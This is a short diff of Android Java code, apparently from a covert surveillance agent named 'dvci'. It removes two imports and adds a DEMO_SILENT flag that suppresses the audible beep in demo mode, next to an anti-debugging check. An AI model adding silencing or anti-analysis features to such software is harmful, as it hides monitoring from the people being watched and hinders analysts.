@@ -17,7 +17,6 @@ import android.content.Context;
 import android.content.res.Resources;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
-import android.view.ViewDebug;
 
 import com.android.dvci.action.Action;
 import com.android.dvci.action.SubAction;
@@ -28,7 +27,6 @@ import com.android.dvci.conf.Configuration;
 import com.android.dvci.crypto.Keys;
 import com.android.dvci.evidence.EvDispatcher;
 import com.android.dvci.evidence.EvidenceBuilder;
-import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.gui.ASG;
@@ -401,7 +399,7 @@ public class Core extends Activity implements Runnable {
 					}
 				}
 
-				if (Cfg.DEMO) {
+				if (Cfg.DEMO && !Cfg.DEMO_SILENT) {
 					Beep.bip();
 				}
 				if (!Cfg.DEBUG && Cfg.CHECK_ANTI_DEBUG) {
